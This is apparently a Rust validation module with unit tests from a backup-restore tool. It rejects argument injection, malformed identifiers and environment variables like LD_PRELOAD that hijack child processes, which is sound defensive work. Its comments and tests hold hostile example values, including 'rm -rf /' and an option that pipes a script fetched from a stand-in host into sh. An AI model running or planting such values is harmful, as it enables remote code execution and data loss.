//! Validation of values that end up as arguments of an external command.
//!
//! `RestoreProof` never builds a shell command line: every external tool is
//! executed with an explicit `argv` array, which already defeats classic shell
//! injection (`; rm -rf /`, backticks, `$(...)`).
//!
//! One class of injection survives `argv` execution: a value that starts with
//! `-` is interpreted by the callee as an **option** rather than as data. A
//! snapshot id of `--password-command=curl evil.sh|sh` would be passed straight
//! to `restic`. The helpers below reject those values at configuration time,
//! which is the earliest possible moment.

use crate::error::{ConfigError, Result};

/// Maximum length accepted for a value handed to an external tool.
const MAX_TOKEN_LEN: usize = 512;

/// Validate a value that will be passed as a single `argv` element.
///
/// # Errors
///
/// Rejects empty values, values starting with `-`, values containing control
/// characters, and values longer than [`MAX_TOKEN_LEN`].
pub fn validate_cli_token(field: &str, value: &str) -> Result<()> {
    if value.is_empty() {
        return Err(ConfigError::Unsafe {
            reason: format!("{field}: value must not be empty"),
        });
    }
    if value.len() > MAX_TOKEN_LEN {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: value is {} bytes long, the maximum is {MAX_TOKEN_LEN}",
                value.len()
            ),
        });
    }
    if value.starts_with('-') {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: `{value}` starts with `-`, which an external tool would interpret as an \
                 option instead of a value. This is refused to prevent argument injection."
            ),
        });
    }
    if let Some(bad) = value.chars().find(|c| c.is_control()) {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: value contains the control character {bad:?}, which is not allowed"
            ),
        });
    }
    Ok(())
}

/// Validate an identifier used for Docker Compose project names and check ids.
///
/// Compose project names become container name prefixes and network names, so
/// the accepted alphabet is deliberately narrow.
///
/// # Errors
///
/// Rejects anything outside `[a-z0-9][a-z0-9_-]{0,62}`.
pub fn validate_identifier(field: &str, value: &str) -> Result<()> {
    let valid_start = value
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
    let valid_rest = value
        .chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_');

    if !(1..=63).contains(&value.len()) || !valid_start || !valid_rest {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: `{value}` is not a valid identifier. Use 1 to 63 characters from \
                 [a-z0-9_-], starting with a letter or a digit."
            ),
        });
    }
    Ok(())
}

/// Environment variables that a configuration file must never set for a child
/// process, because they change *which* code the child executes or *where* it
/// connects.
const FORBIDDEN_ENV: [&str; 12] = [
    "PATH",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "DOCKER_HOST",
    "DOCKER_CONFIG",
    "DOCKER_CERT_PATH",
    "DOCKER_TLS_VERIFY",
    "BASH_ENV",
    "ENV",
];

/// Validate one entry of an `environment:` mapping.
///
/// # Errors
///
/// Rejects malformed names, reserved prefixes, values with control characters
/// and variables that would let the configuration redirect or hijack the child.
pub fn validate_env_entry(field: &str, key: &str, value: &str) -> Result<()> {
    let valid_name = !key.is_empty()
        && key
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_uppercase() || c == '_')
        && key
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
    if !valid_name {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: `{key}` is not a valid environment variable name (expected [A-Z_][A-Z0-9_]*)"
            ),
        });
    }
    if FORBIDDEN_ENV.contains(&key) {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: `{key}` cannot be set from a configuration file because it controls which \
                 program the child process runs or which daemon it talks to"
            ),
        });
    }
    if key.starts_with("RESTOREPROOF_") {
        return Err(ConfigError::Unsafe {
            reason: format!(
                "{field}: the `RESTOREPROOF_` prefix is reserved for injected variables"
            ),
        });
    }
    if value.contains('\0') {
        return Err(ConfigError::Unsafe {
            reason: format!("{field}: the value of `{key}` contains a NUL byte"),
        });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_values_are_accepted() {
        assert!(validate_cli_token("backup.snapshot", "latest").is_ok());
        assert!(validate_cli_token("backup.snapshot", "a1b2c3d4").is_ok());
    }

    #[test]
    fn option_lookalikes_are_refused() {
        let err = validate_cli_token("backup.snapshot", "--password-command=id").unwrap_err();
        assert!(err.to_string().contains("argument injection"));
        assert!(validate_cli_token("backup.snapshot", "-x").is_err());
    }

    #[test]
    fn control_characters_are_refused() {
        assert!(validate_cli_token("x", "a\nb").is_err());
        assert!(validate_cli_token("x", "a\0b").is_err());
    }

    #[test]
    fn empty_and_oversized_values_are_refused() {
        assert!(validate_cli_token("x", "").is_err());
        assert!(validate_cli_token("x", &"a".repeat(513)).is_err());
    }

    #[test]
    fn identifiers_follow_the_compose_alphabet() {
        assert!(validate_identifier("project.name", "example-app").is_ok());
        assert!(validate_identifier("project.name", "app_1").is_ok());
        assert!(validate_identifier("project.name", "Example").is_err());
        assert!(validate_identifier("project.name", "-app").is_err());
        assert!(validate_identifier("project.name", "app/../x").is_err());
        assert!(validate_identifier("project.name", "").is_err());
        assert!(validate_identifier("project.name", &"a".repeat(64)).is_err());
    }

    #[test]
    fn environment_hijacking_variables_are_refused() {
        for key in ["PATH", "LD_PRELOAD", "DOCKER_HOST"] {
            let err = validate_env_entry("recovery.environment", key, "x").unwrap_err();
            assert!(err.to_string().contains(key));
        }
    }

    #[test]
    fn reserved_prefix_is_refused() {
        assert!(validate_env_entry("x", "RESTOREPROOF_RESTORE_DIR", "/tmp").is_err());
    }

    #[test]
    fn ordinary_variables_are_accepted() {
        assert!(validate_env_entry("x", "APP_PORT", "8080").is_ok());
        assert!(validate_env_entry("x", "_INTERNAL", "1").is_ok());
        assert!(validate_env_entry("x", "lowercase", "1").is_err());
    }
}
